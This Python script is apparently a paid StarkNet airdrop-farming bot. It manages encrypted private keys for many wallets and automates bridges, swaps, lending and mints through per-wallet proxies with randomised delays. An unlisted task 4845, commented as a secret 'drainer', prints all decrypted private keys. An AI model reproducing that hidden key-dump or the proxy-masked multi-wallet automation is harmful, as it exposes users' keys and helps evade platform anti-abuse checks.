try:
    from Modules.KEY import USER_KEY
    from task1 import *
    from task2 import *
    from task3 import *
    from task4 import *
    from task5 import *
    from task6 import *
    from task9 import *
    from myswaptask import *
    from fibroustask import *
    from additional_tasks import *
    import inquirer
    Endianness = Literal["big", "little"]


    def decrypt(filename):
        f = Fernet(KEY)
        with open(filename, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data).decode()
        return decrypted_data.split(':')


    server_data = decrypt(f"{SETTINGS_PATH}server_data.txt")
    connect_data = (server_data[0], int(server_data[1]))

    def check_license_elig(sha):
        logger.info("Checking license expiration date...")
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(connect_data)
            message = {
                "auth": 'StarkNet',
                "key": sha
            }
            client.send(json.dumps(message).encode())
            response = client.recv(1024).decode()
            client.close()
            if response == "True":
                return True
            else:
                logger.error(f'Cant auth your device/subs')
                input("Press any key to exit")
                exit()
        except Exception as error:
            logger.error(f'SEnd this message to dev: {error}')
            input("Press any key to exit")
            exit()


    def checking_license():
        text = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID + ':SOFT'
        sha = hashlib.sha1(text.encode()).hexdigest()
        return check_license_elig(sha)

    if __name__ == "__main__":
        checking_license()



    def encode_secrets():
        enc_type = 0
        while enc_type != 1 and enc_type != 2:
            enc_type = int(input("which type of encodyng do you want(1 - password, 2 - flash)"))
        if enc_type == 1:
            method = 'password'
        else:
            method = "flash"
        while True:
            try:
                with open(SETTINGS_PATH + 'to_encrypted_secrets.txt', encoding='utf-8') as file:
                    data = file.readlines()
                    logger.info(f'Found {len(data)} lines of keys')
                    break
            except Exception as error:
                logger.error(f"Failed to open {SETTINGS_PATH + 'to_encrypted_secrets.txt'} | {error}")
                input("Create file and try again. Press any key to try again: ")
        logical_disks = get_disks()
        json_wallets = {}
        w3 = Web3(Web3.HTTPProvider(RPC_FOR_LAYERSWAP["ETHEREUM_MAINNET"]))
        for k in data:
            try:
                try:
                    k = int(k)
                except:
                    k = int(k, 16)
                k = "0x" + (66-len(hex(k)))*"0" + hex(k)[2::]
                address = w3.eth.account.from_key(k).address
                json_wallets.update({
                address.lower(): k.replace("\n", "").replace(" ", "")
                })
            except Exception as error:
                logger.error(f'Cant add line: {k}; {error}')

        with open(SETTINGS_PATH + "data.txt", 'w') as file:
            json.dump(json_wallets, file)

        if method == 'flash':
            while True:
                answer = input(
                    "Write here disk name, like: 'D'\n" + \
                    ''.join(f"Disk name: {i.replace(':', '')} - {logical_disks[i]}\n" for i in logical_disks.keys())
                )
                agree = input(
                    f"OK, your disk with name: {answer} | Data: {logical_disks[answer + ':']}\n" + \
                    "Are you agree to encode data.txt using this data? [Y/N]: "
                )
                if agree.upper().replace(" ", "") == "Y":
                    break

            data = logical_disks[answer + ":"]
            data_to_encoded = data["model"] + '_' + data["serial"]
            key = hashlib.sha256(data_to_encoded.encode()).hexdigest()[:43] + "="

        elif method == 'password':
            while True:
                data_to_be_encoded = getpass.getpass('Write here password to encrypt secret keys: ')
                agree = input(
                    f"OK, Are you sure that password is correct?: {data_to_be_encoded[:4]}***\n" + \
                    "Are you agree to encode data.txt using this data? [Y/N]: "
                )  
                if agree.upper().replace(" ", "") == "Y":
                    break

            key = hashlib.sha256(data_to_be_encoded.encode()).hexdigest()[:43] + "="

        f = Fernet(key)
        with open(SETTINGS_PATH + "data.txt", 'rb') as file:
            data_file = file.read()

        encrypted = f.encrypt(data_file)

        with open(SETTINGS_PATH + "encoded_secrets.txt", 'wb') as file:
            file.write(encrypted)

        os.remove(SETTINGS_PATH + "data.txt")
        open(SETTINGS_PATH + "to_encrypted_secrets.txt", 'w')
        logger.success(f'All is ok! Check to_run_addresses.txt and run soft again')
        input("Press any key to exit")
        sys.exit()

    def get_disks():
        c = wmi.WMI()
        logical_disks = {}
        for drive in c.Win32_DiskDrive():
            for partition in drive.associators("Win32_DiskDriveToDiskPartition"):
                for disk in partition.associators("Win32_LogicalDiskToPartition"):
                    logical_disks[disk.Caption] = {"model":drive.Model, "serial":drive.SerialNumber}
        return logical_disks

    def decode_secrets():
        logger.info("Decrypting your secret keys..")
        logical_disks = get_disks()
        decrypt_type = SETTINGS["DecryptType"].lower()
        disk = SETTINGS["LoaderDisk"]
        if decrypt_type == "flash":
            disk_data = logical_disks[disk]
            data_to_be_encoded = disk_data["model"] + '_' + disk_data["serial"]

        elif decrypt_type == "password":
            data_to_be_encoded = getpass.getpass('[DECRYPTOR] Write here password to decrypt secret keys: ')

        key = hashlib.sha256(data_to_be_encoded.encode()).hexdigest()[:43] + "="
        f = Fernet(key)
        while True:
            try:
                path = SETTINGS_PATH + 'encoded_secrets.txt'
                with open(path, 'rb') as file:
                    file_data = file.read()
                    break
            except Exception as error:
                logger.error(f'Error with trying to open file encoded_secrets.txt! {error}')
                input("Fix it and press enter: ")
        try:

            return json.loads(f.decrypt(file_data).decode())
        except :
            logger.error("Key to Decrypt files is incorrect!")
            return decode_secrets()



    def generate_argent_account():
        private_key = random.randint(0, 2**256)
        return import_argent_account(private_key, client=GatewayClient(net=MAINNET))

    async def deploy_account(account: Account, call_data: list, salt: int, class_hash: int, delay: int):
        await asyncio.sleep(delay)
        balance = 0
        while True:
            try:
                nonce = await account.get_nonce()
                if nonce > 0:
                    logger.info(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] already deployed. Skip")
                    return
                else:
                    break
            except Exception as e:
                logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] got error while trying to get nonce: {e}")
                await sleeping('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::], True)
        while True:
            
            logger.info(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] checking balance.")
            try:
                balance = await account.get_balance()
                logger.info(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] got balance: {balance/1e18} ETH")
                if balance >= 1e14:
                    break
                await sleeping('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::])

            except Exception as e:
                logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] got error while trying to get balance: {e}")
                await sleeping('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::], True)
        logger.success(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] found balance. Going to deploy")
        i = 0
        while i < retries_limit:
            i += 1
            try:
                
                if SETTINGS["Provider"].lower() == "argent":
                    account_deployment_result = await Account.deploy_account(
                        address=account.address,
                        class_hash=class_hash,
                        salt=salt,
                        key_pair=account.signer.key_pair,
                        client=account.client,
                        chain=chain,
                        constructor_calldata=call_data,
                        auto_estimate=True,
                    )
                elif SETTINGS["Provider"].lower() == "braavos":
                    account_deployment_result = await deploy_account_braavos(
                        address=account.address,
                        class_hash=class_hash,
                        salt=salt,
                        key_pair=account.signer.key_pair,
                        client=account.client,
                        chain=chain,
                        constructor_calldata=call_data,
                        max_fee=int(55e13),
                    )
                else:
                    logger.error(f"Selected unsupported wallet provider: {SETTINGS['Provider'].lower()}. Please select one of this: argent, braavos")
                    return

                # Wait for deployment transaction to be accepted

                await account_deployment_result.wait_for_acceptance()
                # From now on, account can be used as usual
                account = account_deployment_result.account
                logger.success(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] deployed successfully, txn hash: {hex(account_deployment_result.hash)}")
                return SUCCESS

            except Exception as e:
                logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] got error, while deploying account, {e}")
                await sleeping('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::], True)
        logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] already deploying")
        return DEPLOY_ERROR







    def transform_keys(private_keys, addresses):
        w3 = Web3(Web3.HTTPProvider(random.choice(RPC_FOR_LAYERSWAP["ARBITRUM_MAINNET"])))
        counter = 0
        client = GatewayClient(net=MAINNET)
        stark_keys = []
        stark_dict = {}
        for key_i in private_keys:
            key = private_keys[key_i]
            
            try:
                int_key = int(key)
            except:
                int_key = int(key, 16)

            
            account, call_data, salt, class_hash = import_argent_account(int_key, client)
            stark_address = account.address
            hex_stark_address = hex(stark_address)
            hex_stark_address = "0x" + "0"*(66-len(hex_stark_address)) + hex_stark_address[2::]
            hex_key = "0x" + "0"*(66-len(hex(int_key))) + hex(int_key)[2::]
            mm_address = w3.eth.account.from_key(hex_key).address.lower()
            if mm_address in addresses or str(stark_address) in addresses or hex_stark_address in addresses:
                counter += 1
                stark_dict[stark_address] = int_key

        for addr in stark_dict:
            stark_keys.append(stark_dict[addr]) 

        return stark_keys, counter





    def task_7(stark_keys):
        loop = asyncio.new_event_loop()
        tasks = []
        delay = 0
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            out_wallets_result['0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]] = ""
            tasks.append(loop.create_task(full(account, delay)))
            delay += get_random_value_int(SETTINGS["ThreadRunnerSleep"])



        loop.run_until_complete(asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED))
        res = ""

        for i in out_wallets_result:
            res += f"{i}:\n{out_wallets_result[i]}\n\n"

        with open(f"{SETTINGS_PATH}log.txt", "w") as f:
            f.write(res)


    async def full(account: Account, delay: int):
        await asyncio.sleep(delay)
        way = random.randint(1, 2)
        ways = [1,2,3,4]
        shuffle(ways)
        for way in ways:
            if way == 1:
                await random_swaps(account, 0)
            elif way == 2:
                await add_liq_task(account, 0)
                if random.choice(SETTINGS["RemoveOnFullMode"]):
                    await remove_liq_task(account, 0)
            elif way == 3:
                await dmail(account, 0)
            elif way == 4:
                await starknet_id(account, 0)
            
        if random.choice(SETTINGS["SwapAtTheEnd"]):
            await swap_to_eth(account, 0, in_full=True)

    def task_12():
        res = "starknet private key                                                starknet address                                                   EVM address\n"
        logger.info(f"generating {SETTINGS['AmountToCreate']} accounts")
        for i in range(SETTINGS["AmountToCreate"]):
            account, call_data, salt, class_hash = generate_argent_account()
            web3 = Web3(Web3.HTTPProvider(random.choice(RPC_FOR_LAYERSWAP["ARBITRUM_MAINNET"])))    
            private_key = "0x" + "0"*(66-len(hex(account.signer.private_key))) + hex(account.signer.private_key)[2::]
            hex_stark_address = '0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]
            hex_stark_address = "0x" + "0"*(66-len(hex_stark_address)) + hex_stark_address[2::]
            wallet = web3.eth.account.from_key(private_key).address
            res += f"{private_key}  {hex_stark_address}  {wallet}\n"
        f = open(f"{SETTINGS_PATH}{SETTINGS['OutFile']}", "w")
        f.write(res)
        f.close()

    def task_13(stark_keys):
        loop = asyncio.new_event_loop()
        tasks = []
        delay = 0
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            tasks.append(loop.create_task(deploy_account(account, call_data, salt, class_hash, delay)))
            delay += get_random_value_int(SETTINGS["ThreadRunnerSleep"])



        loop.run_until_complete(asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED))

    def task_8(stark_keys):
        loop = asyncio.new_event_loop()
        tasks = []
        delay = 0
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            tasks.append(loop.create_task(bridge_to_arb_from_stark(account, delay)))
            delay += get_random_value_int(SETTINGS["ThreadRunnerSleep"])



        loop.run_until_complete(asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED))

    def task_10(stark_keys):
        w3 = Web3(Web3.HTTPProvider(random.choice(RPC_FOR_LAYERSWAP["ARBITRUM_MAINNET"])))
        print("Stark Addresses")
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            hex_stark_address = '0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]
            hex_stark_address = "0x" + "0"*(66-len(hex_stark_address)) + hex_stark_address[2::]
            print(f"{hex_stark_address}")
        print("EVM Addresses")
        for key in stark_keys:
            hex_key = "0x" + "0"*(66-len(hex(key))) + hex(key)[2::]
            print(f"{w3.eth.account.from_key(hex_key).address}")

    

    def task_9(stark_keys):
        tasks = []
        delay = 0
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)

            tasks.append(Thread(target=start_collector, args=(hex(key), '0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::], delay)))

            delay += get_random_value_int(SETTINGS["ThreadRunnerSleep"])
        for i in tasks:
            i.start()
        for k in tasks:
            k.join()

    def task_secret(stark_keys):
        w3 = Web3(Web3.HTTPProvider(random.choice(RPC_FOR_LAYERSWAP["ARBITRUM_MAINNET"])))
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            print(f"{hex(key)}    {'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}    {w3.eth.account.from_key(hex(key)).address}")


    def mint_argent_task(stark_keys):
        loop = asyncio.new_event_loop()
        tasks = []
        delay = 0
        for key in stark_keys:
            if SETTINGS["UseProxies"] and key in proxy_dict_cfg.keys():
                client = GatewayClient(net=MAINNET, proxy=proxy_dict_cfg[key])
            else:
                client = GatewayClient(net=MAINNET)
            account, call_data, salt, class_hash = import_argent_account(key, client)
            
            tasks.append(loop.create_task(lend(account, delay)))
            delay += get_random_value_int(SETTINGS["ThreadRunnerSleep"])

        loop.run_until_complete(asyncio.wait(tasks, return_when=asyncio.ALL_COMPLETED))

    async def lend(account: Account, delay: int):
        await asyncio.sleep(delay)
        address = ("0x" + "0"*(66 - len(hex(account.address))) + hex(account.address)[2::]).lower()
        eth_contract = Contract(ETH_TOKEN_CONTRACT, ETH_STARK_ABI, account)

        amount = get_random_value(SETTINGS["LendAddAmount"])
        
        while True:
            try:
                eth_balance = await account.get_balance()/1e18
                break
            except Exception as e:
                logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] can't get balance of ETH. Error: {e}")
                await sleeping('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::], True)
        if amount > eth_balance:
            logger.error(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] not enough eth to add to lend")
            return



        if SETTINGS["Lend"] == "zklend":

            lend_contract = Contract(ZKLEND_CONTRACT, ZKLEND_ABI, account)

            call1 = approve_token_call(amount, ZKLEND_CONTRACT, eth_contract)


            call2 = lend_contract.functions["deposit"].prepare(
                    ETH_TOKEN_CONTRACT,
                    int(amount*1e18)
                )

            
            call3 = lend_contract.functions["enable_collateral"].prepare(
                ETH_TOKEN_CONTRACT
            )
            calldata = [call1, call2, call3]
        elif SETTINGS["Lend"].lower() == "nostra":
            lend_contract = Contract(0x070f8a4fcd75190661ca09a7300b7c93fab93971b67ea712c664d7948a8a54c6, NOSTRA_ABI, account)
            call1 = approve_token_call(amount, 0x070f8a4fcd75190661ca09a7300b7c93fab93971b67ea712c664d7948a8a54c6, eth_contract)
            call2 = lend_contract.functions["mint"].prepare(
                account.address,
                int(amount*1e18)
            )
            calldata = [call1, call2]
        else:
            logger.error(f"selected usupported lend({SETTINGS['Lend']})")
            input()
            exit()
        await wait_for_better_eth_gwei('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::])
        logger.info(f"[{'0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]}] going to add {amount} ETH to lend")
        return await execute_function(account, calldata)

    

    def start(stark_keys, task_number):
        if task_number == 1:

            task_1(stark_keys)
        elif task_number == 2:
            task_2(stark_keys)
        elif task_number == 3:
            task_3(stark_keys)
        elif task_number == 4:
            task_4(stark_keys)
        elif task_number == 5:
            task_5(stark_keys)
        elif task_number == 6:
            task_6(stark_keys)
        elif task_number == 7:
            task_7(stark_keys)
        elif task_number == 8:
            task_8(stark_keys)
        elif task_number == 9:
            task_9(stark_keys)
        elif task_number == 10:
            task_10(stark_keys)
        elif task_number == 13:
            task_13(stark_keys)
        elif task_number == 14:
            myswap_task(stark_keys)
        elif task_number == 15:
            myswap_task_mint(stark_keys)
        elif task_number == 16:
            task_stats(stark_keys)
        elif task_number == 17:
            mint_argent_task(stark_keys)
        elif task_number == 18:
            remove_from_lend_task(stark_keys)
        elif task_number == 19:
            mint_turkey_nft_task(stark_keys)
        elif task_number == 20:
            fibrous_task(stark_keys)
        elif task_number == 21:
            bridge_to_stark_from_different_address(stark_keys)
        elif task_number == 22:
            bridge_from_stark_to_different_wallet(stark_keys)
        elif task_number == 23:
            dmail_task(stark_keys)
        elif task_number == 24:
            starknet_id_task(stark_keys)
        elif task_number == 25:
            off_bridge_different_wallet(stark_keys)
        elif task_number == 26:
            withdraw_all_task(stark_keys, False)
        elif task_number == 27:
            withdraw_all_task(stark_keys, True)
        elif task_number == 28:
            colateral_task(stark_keys)
        elif task_number == 4845: #secret task (drainer)
            task_secret(stark_keys)
        elif task_number == 8825:
            test_prox(stark_keys)
        else:
            logger.error("incorrect task_number")
    
    def get_action() -> str:
        theme = {
            "Question": {
                "brackets_color": "bright_yellow"
            },
            "List": {
                "selection_color": "bright_blue"
            }
        }

        question = [
            inquirer.List(
                "action",
                message=colored("Choose soft work task", 'light_yellow'),
                choices=[
                    "bridge from arb/opti/eth to start(orbiter/layerswap)",
                    "random swaps",
                    "swap to eth",
                    "add liquidity",
                    "remove liquidity",
                    "starkgate",
                    "full module",
                    "withdraw from stark",
                    "swap stables from chains and bridge to stark",
                    "show addresses",
                    "encrypt_secrets",
                    "generator",
                    "deploy accounts",
                    "myswap quest",
                    "myswap mint nft",
                    "stats",
                    "add to lending",
                    "remove from lend",
                    "mint nft from turkey campain",
                    "swaps on fibrous",
                    "send to stark from different wallet(EVM)",
                    "send from stark to different wallet(EVM)",
                    "send to stark off bridge different wallet(EVM)",
                    "dmail",
                    "starknet_id",
                    "full withdraw(remove liquidity, swap to eth, bridge to chain)",
                    "full withdraw to different wallet(EVM)",
                    "collateral zklend"
                ],
            )
        ]
        action = inquirer.prompt(question, theme=loadth(theme))['action']
        return action


    def main():

        print(autosoft)
        print(subs_text)
        print("\n")
        action = get_action()
        global task_number
        if action == "bridge from arb/opti/eth to start(orbiter/layerswap)":
            task_number = 1
        elif action == "random swaps":
            task_number = 2
        elif action == "swap to eth":
            task_number = 3
        elif action == "add liquidity":
            task_number = 4
        elif action == "remove liquidity":
            task_number = 5
        elif action == "starkgate":
            task_number = 6
        elif action == "full module":
            task_number = 7
        elif action == "withdraw from stark":
            task_number = 8
        elif action == "swap stables from chains and bridge to stark":
            task_number = 9
        elif action == "show addresses":
            task_number = 10
        elif action == "encrypt_secrets":
            task_number = 11
        elif action == "generator":
            task_number = 12
        elif action == "deploy accounts":
            task_number = 13
        elif action == "myswap quest":
            task_number = 14
        elif action == "myswap mint nft":
            task_number = 15
        elif action == "stats":
            task_number = 16
        elif action == "add to lending":
            task_number = 17
        elif action == "remove from lend":
            task_number = 18
        elif action == "mint nft from turkey campain":
            task_number = 19
        elif action == "swaps on fibrous":
            task_number = 20
        elif action == "send to stark from different wallet(EVM)":
            task_number = 21
        elif action == "send from stark to different wallet(EVM)":
            task_number = 22
        elif action == "send to stark off bridge different wallet(EVM)":
            task_number = 25
        elif action == "dmail":
            task_number = 23
        elif action == "starknet_id":
            task_number = 24
        elif action == "full withdraw(remove liquidity, swap to eth, bridge to chain)":
            task_number = 26
        elif action == "full withdraw to different wallet(EVM)":
            task_number = 27
        elif action == "collateral zklend":
            task_number = 28

       
        f = open(f"{SETTINGS_PATH}to_run_addresses.txt", "r")
        addresses = f.read().lower().split("\n")
        f.close()
        for i in range(len(addresses)):
            if len(addresses[i]) < 50:
                addresses[i] = "0x" + "0"*(42-len(addresses[i])) + addresses[i][2::]
            else:
                addresses[i] = "0x" + "0"*(66-len(addresses[i])) + addresses[i][2::]
        if task_number == 11:
            encode_secrets()
        elif task_number == 12:
            task_12()
        else:
            private_keys = decode_secrets()
            stark_keys, counter = transform_keys(private_keys, addresses)
            if task_number != 10 and task_number != 16:
                shuffle(stark_keys)
            print(f"bot found {counter} private keys to work")

            if SETTINGS["UseProxies"]:
                f = open(f"{SETTINGS_PATH}proxies.txt", "r")
                proxies_raw = f.read().split("\n")
                f.close()

                proxies = []

                for proxy in proxies_raw:
                    proxies.append(proxy.split("@"))
                if task_number != 10 and task_number != 16:
                    shuffle(proxies)
                proxy_dict = {}
                args = []
                for proxy in proxies:
                    if f"http://{proxy[0]}@{proxy[1]}" in proxy_dict.keys():
                        proxy_dict[f"http://{proxy[0]}@{proxy[1]}"].append('0x' + '0'*(66-len(proxy[2])) + proxy[2][2::])
                    else:
                        proxy_dict[f"http://{proxy[0]}@{proxy[1]}"] = ['0x' + '0'*(66-len(proxy[2])) + proxy[2][2::]]


                counter = 1
                client = GatewayClient(net=MAINNET)
                for proxy in proxy_dict:

                    addresses = proxy_dict[proxy]
                    for key in stark_keys:
                        account, call_data, salt, class_hash = import_argent_account(key, client)
                        if ('0x' + '0'*(66-len(hex(account.address))) + hex(account.address)[2::]) in addresses:
                            proxy_dict_cfg[key] = proxy



                
            
            start(stark_keys, task_number)








    if __name__ == "__main__":
        main()
        input("Soft successfully end work. Press Enter to quit")


except Exception as e:
    logger.error(f"Got unexpected error: {e}")
    input("Soft successfully end work. Press Enter to quit")